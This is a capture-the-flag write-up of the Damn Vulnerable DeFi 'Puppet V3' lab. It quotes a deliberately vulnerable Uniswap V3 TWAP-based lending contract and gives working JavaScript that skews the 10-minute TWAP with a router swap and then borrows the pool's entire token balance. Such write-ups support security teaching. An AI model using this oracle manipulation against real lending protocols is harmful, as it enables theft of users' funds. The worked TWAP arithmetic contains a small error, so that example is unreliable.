<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/14.png">

# Target Contract Review

Given contract.

**PupppetV3Pool.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";

/**
 * @title PuppetV3Pool
 * @notice A simple lending pool using Uniswap v3 as TWAP oracle.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetV3Pool {
    uint256 public constant DEPOSIT_FACTOR = 3;
    uint32 public constant TWAP_PERIOD = 10 minutes;

    IERC20Minimal public immutable weth;
    IERC20Minimal public immutable token;
    IUniswapV3Pool public immutable uniswapV3Pool;

    mapping(address => uint256) public deposits;

    event Borrowed(address indexed borrower, uint256 depositAmount, uint256 borrowAmount);

    constructor(IERC20Minimal _weth, IERC20Minimal _token, IUniswapV3Pool _uniswapV3Pool) {
        weth = _weth;
        token = _token;
        uniswapV3Pool = _uniswapV3Pool;
    }

    /**
     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH.
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and the borrowed token have the same number of decimals.
     * @param borrowAmount amount of tokens the user intends to borrow
     */
    function borrow(uint256 borrowAmount) external {
        // Calculate how much WETH the user must deposit
        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);

        // Pull the WETH
        weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);

        // internal accounting
        deposits[msg.sender] += depositOfWETHRequired;

        TransferHelper.safeTransfer(address(token), msg.sender, borrowAmount);

        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount);
    }

    function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
        uint256 quote = _getOracleQuote(_toUint128(amount));
        return quote * DEPOSIT_FACTOR;
    }

    function _getOracleQuote(uint128 amount) private view returns (uint256) {
        (int24 arithmeticMeanTick,) = OracleLibrary.consult(address(uniswapV3Pool), TWAP_PERIOD);
        return OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            amount, // baseAmount
            address(token), // baseToken
            address(weth) // quoteToken
        );
    }

    function _toUint128(uint256 amount) private pure returns (uint128 n) {
        require(amount == (n = uint128(amount)));
    }
}
```

The PuppetV3Pool contract is a simple lending pool that uses Uniswap v3 as a time-weighted average price (TWAP) oracle. It allows users to borrow tokens by depositing three times the value of the borrowed tokens in WETH.

The constructor initializes the contract with the WETH token, borrowed token, and Uniswap v3 pool.

`borrow()` : Allows users to borrow tokens by depositing three times the value of the borrowed tokens in WETH. The user must have approved enough WETH in advance. The function transfers the required WETH from the user to the contract, updates the internal deposit accounting, and transfers the borrowed tokens to the user.

`calculateDepositOfWETHRequired()` : Calculates the amount of WETH required to deposit based on the desired borrow amount. It uses the TWAP oracle to get the quote for the borrowed token and multiplies it by the DEPOSIT_FACTOR.

`_getOracleQuote()`: Gets the quote for the borrowed token using the TWAP oracle. It uses the Uniswap v3 pool and the OracleLibrary to calculate the quote at the current arithmetic mean tick.

`_toUint128()`:  Converts a uint256 value to uint128. It is used to ensure that the amount fits within a uint128 value.





Challenge's message:

> Even on a bear market, the devs behind the lending pool kept building.
In the latest version, they’re using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.
The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.
Starting with 1 ETH and some DVT, pass this challenge by taking all tokens from the lending pool.
NOTE: unlike others, this challenge requires you to set a valid RPC URL in the challenge’s test file to fork mainnet state into your local environment.


## TWAP Oracles 

<p align="center"><img height="400" src="https://docs.uniswap.org/assets/images/v2_twap-fdc82ab82856196510db6b421cce9204.png"></p>

A TWAP (Time-Weighted Average Price) oracle is a specialized type of oracle **designed to supply data regarding an asset's average price throughout a defined time frame**. 
For instance, if a user configures a 10-day interval for the TWAP oracle, the oracle will provide the average price of the asset over the span of ten consecutive days.

A weighted average involves **multiplying values in a dataset by predefined weights and then summing them up in the calculation**. This method assigns specific importance or significance to different values within the dataset. It is regarded as a more accurate approach compared to **simply adding up all the values and dividing by the total number of values (n) to compute the average**.

TWAP oracles address a specific issue related to on-chain oracles, primarily centered around **price manipulation**. 

> The TWAP oracle is a method that takes duration into account when weighing prices. The price (P) is multiplied by its duration (T) and added to a cumulative value (C) at various checkpoints, typically at the end of a block. Ultimately, the total cumulative value is divided by the total duration to calculate the average price over the specified period.

We use the TWAP mechanism to calculate the average price of ETH over a 150-second interval:

```
The Formula: P x T = C

// Starting
// T=0 and P=1000$
// 1000 x 0 = 0
// C is 0


// After 50 seconds
// T=50 and P=1000$
// (50 – 0) x 1000 = 50,000
// C is increases to 50,000


// After 100 seconds
// T=150 and P=1000$
// (150 – 50) x 1000 = 100,000
// C is increases to 100,000

```

Remember that the calculations use the last price of an asset at the previous block instead of the price at the current one. **By using the value of P at the last transaction in a block, TWAP oracles increase the difficulty of successfully executing price manipulation**. 


# Subverting

The lending pool contract leverages Uniswap V3's liquidity pool Oracle function, which employs a TWAP methodology for determining the price of DVT in relation to WETH. Unlike traditional methods that rely on the current reserve amounts, **TWAP considers historical data spanning a defined time frame, typically 10 minutes in this instance, to compute the average price within that specific duration**.

This challenge involves exploiting the fact that a 10-minute TWAP is not effective in reducing short-term volatility. The task at hand is to take all the funds from the lending pool in less than 115 seconds, which is almost 20% of the TWAP period, as stipulated in the solution's constraints.

To perform the swap, we must connect the `Uniswap V3 router`. The router will perform complex calculations to enhance user experience instead of directly interacting with Uniswap V3 pools. We can obtain the official Uniswap V3 router address from the Uniswap documentation and connect to it, just as we connect to the existing Uniswap V3 Factory in the challenge setup.

```js
const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
```

After then, we will approve the router to take our DVT tokens for the trade and then perform the swap.

```js
await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
await uniswapRouter.exactInputSingle(
    [token.address,
    weth.address,   
    3000,
    player.address,
    PLAYER_INITIAL_TOKEN_BALANCE,
    0,
    0],
    {
gasLimit: 1e7
    }
);
```

This operation swaps 110 DVT tokens for the maximum amount of WETH possible. We should wait for a little while to give the new price more influence in the calculation. As per the challenge's constraints, we only have 115 seconds, so we can skip ahead 110 seconds, leaving us with enough time to complete any other necessary transactions, such as approvals and swaps. 

Next, we approve that amount to be transferred to the contract and then execute the `borrow()` function.

```js
await time.increase(100);
await weth.connect(player).approve(lendingPool.address, await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
```


Here are the attacker commands:

```js
const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
await uniswapRouter.exactInputSingle(
    [token.address,
    weth.address,   
    3000,
    player.address,
    PLAYER_INITIAL_TOKEN_BALANCE,
    0,
    0],
    {
gasLimit: 1e7
    }
);
await time.increase(100);
await weth.connect(player).approve(lendingPool.address, await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
```

Install dependencies and import swap router's json.

```shell
yarn add @uniswap/swap-router-contracts
```

```js
const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
```

Solve the challenge.

```powershell


  [Challenge] Puppet v3
    ✔ Execution (1775ms)


  1 passing (7s)

Done in 8.07s.
```

**_by wasny0ps_**

